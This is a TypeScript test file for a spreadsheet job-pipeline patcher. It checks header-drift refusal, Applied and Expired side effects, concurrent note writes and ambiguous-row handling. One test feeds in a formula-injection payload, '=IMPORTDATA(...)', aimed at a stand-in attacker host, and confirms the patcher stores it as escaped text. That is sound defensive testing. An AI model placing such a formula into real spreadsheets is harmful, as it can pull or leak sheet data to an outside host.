// BEAUDIT lane S: /pipeline-update patcher integrity. Promotes probes p08
// (header drift) and p09 (Applied side effects, concurrent note race).
import assert from "node:assert/strict";
import test from "node:test";

import {
  PipelineAmbiguousMatchError,
  createPipelinePatcher,
} from "../../src/sheets/pipeline-patcher.ts";
import { PipelineHeaderMismatchError } from "../../src/sheets/sheets-client.ts";
import { HEADER, createFakeSheets, pipelineRow, runtimeConfig } from "./fake-sheets.ts";

const NOW = () => new Date("2026-09-25T12:00:00Z");
const url = "https://acme.example/jobs/1";

function seed(rows: string[][], header: string[] = HEADER) {
  return createFakeSheets({ Pipeline: [header, ...rows] });
}

test("D6: a drifted header is refused with header_mismatch and nothing is written (p08)", async () => {
  const header = [...HEADER.slice(0, 5), "Referral?", ...HEADER.slice(5)];
  const row = header.map((h) => ({ Title: "Engineer", Company: "Acme", Link: url, Status: "Researching", Notes: "keep me", Contact: "Sam" } as Record<string, string>)[h] ?? "");
  const sheet = seed([row], header);
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  await assert.rejects(
    patcher.patch("fake-sheet", { job: { url }, fields: { stage: "Interviewing", note: "onsite booked" } }),
    (error: unknown) => {
      assert.ok(error instanceof PipelineHeaderMismatchError);
      assert.equal(error.code, "header_mismatch");
      assert.equal(error.column, "F");
      assert.equal(error.expected, "Source");
      assert.equal(error.found, "Referral?");
      return true;
    },
  );
  assert.equal(sheet.calls.filter((c) => c.kind === "values.batchUpdate").length, 0);
});

test("D7: stage=Applied writes Applied Date, a +7d Follow-up and an audit note (p09)", async () => {
  const sheet = seed([pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching", notes: "seed" })]);
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  await patcher.patch("fake-sheet", {
    job: { url },
    fields: { stage: "Applied", appliedDate: "2026-09-24", source: "Company portal", note: "Receipt R-17" },
  });
  const r = sheet.tabs.get("Pipeline")![1];
  assert.equal(r[12], "Applied");
  assert.equal(r[13], "2026-09-24");
  assert.equal(r[15], "2026-10-01");
  assert.equal(r[14].split("\n")[0], "[2026-09-25] Applied via Company portal: Receipt R-17");
  assert.equal(r[14].split("\n")[1], "seed");
});

test("D7: stage=Applied with no date defaults Applied Date to today", async () => {
  const sheet = seed([pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching" })]);
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  await patcher.patch("fake-sheet", { job: { url }, fields: { stage: "Applied" } });
  const r = sheet.tabs.get("Pipeline")![1];
  assert.equal(r[13], "2026-09-25");
  assert.equal(r[15], "2026-10-02");
  assert.match(r[14], /^\[2026-09-25\] Applied$/);
});

test("D8: two concurrent note appends keep both notes (p09)", async () => {
  const sheet = seed([pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching", notes: "seed" })]);
  let arrivals = 0;
  let release!: () => void;
  const barrier = new Promise<void>((r) => (release = r));
  sheet.hooks.onRead = async (range) => {
    if (range.startsWith("Pipeline!A1:")) return;
    arrivals += 1;
    if (arrivals === 2) release();
    await Promise.race([barrier, new Promise((r) => setTimeout(r, 50))]);
  };
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  await Promise.all([
    patcher.patch("fake-sheet", { job: { url }, fields: { note: "recruiter emailed" } }),
    patcher.patch("fake-sheet", { job: { url }, fields: { note: "Hermes follow-up sent" } }),
  ]);
  const notes = sheet.tabs.get("Pipeline")![1][14];
  assert.match(notes, /recruiter emailed/);
  assert.match(notes, /Hermes follow-up sent/);
  assert.match(notes, /seed/);
});

test("D2: a row that moved after the match is patched at its new position", async () => {
  const other = pipelineRow({ title: "Other", company: "Other", link: "https://other.example/1", status: "New" });
  const target = pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching" });
  const sheet = seed([other, target]);
  let moved = false;
  sheet.hooks.onRead = (range) => {
    if (moved || range.startsWith("Pipeline!A1:")) return;
    moved = true;
    sheet.tabs.get("Pipeline")!.splice(1, 1); // the user deletes the row above
  };
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  const result = await patcher.patch("fake-sheet", { job: { url }, fields: { stage: "Interviewing" } });
  const rows = sheet.tabs.get("Pipeline")!.slice(1);
  assert.equal(rows.length, 1);
  assert.equal(rows[0][4], url);
  assert.equal(rows[0][12], "Interviewing");
  assert.equal(result.rowNumber, 2);
});

test("v2: a URL on two rows is refused with ambiguous_match", async () => {
  const sheet = seed([
    pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "New" }),
    pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching" }),
  ]);
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  await assert.rejects(
    patcher.patch("fake-sheet", { job: { url }, fields: { stage: "Offer" } }),
    (error: unknown) => {
      assert.ok(error instanceof PipelineAmbiguousMatchError);
      assert.equal(error.code, "ambiguous_match");
      assert.deepEqual(error.rowNumbers, [2, 3]);
      return true;
    },
  );
  assert.equal(sheet.calls.filter((c) => c.kind === "values.batchUpdate").length, 0);
});

test("D10: stage=Expired writes Status, clears Follow-up and adds an audit line", async () => {
  const sheet = seed([pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching", followUp: "2026-10-01" })]);
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  await patcher.patch("fake-sheet", { job: { url }, fields: { stage: "Expired" } });
  const r = sheet.tabs.get("Pipeline")![1];
  assert.equal(r[12], "Expired");
  assert.equal(r[15], "");
  assert.equal(r[14], "[2026-09-25] Marked Expired");
});

test("D5: a note that starts like a formula is written as text", async () => {
  const sheet = seed([pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching" })]);
  const patcher = createPipelinePatcher(runtimeConfig, { fetchImpl: sheet.fetchImpl, now: NOW });
  await patcher.patch("fake-sheet", { job: { url }, fields: { contact: "=IMPORTDATA(\"https://attacker.invalid\")" } });
  const update = sheet.calls.find((c) => c.kind === "values.batchUpdate")!;
  const values = JSON.parse(update.body).data.map((d: { values: string[][] }) => d.values[0][0]);
  assert.deepEqual(values, ["'=IMPORTDATA(\"https://attacker.invalid\")"]);
});
